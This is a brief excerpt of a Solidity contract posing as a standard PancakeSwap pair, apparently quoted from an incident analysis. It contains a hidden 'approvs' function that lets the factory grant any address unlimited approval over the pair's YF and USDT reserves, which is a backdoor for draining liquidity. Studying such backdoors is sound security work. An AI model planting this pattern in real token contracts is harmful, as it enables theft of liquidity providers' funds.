...
contract PancakePair is IPancakePair, PancakeERC20 {
    ...
    function approvs(address _token0,address YF,address USDT ) external {
        require(msg.sender == factory, 'Pancake: FORBIDDEN'); // sufficient check
         IERC20(YF).approve(address(_token0), ~uint256(0));
         IERC20(USDT).approve(address(_token0), ~uint256(0));
     }
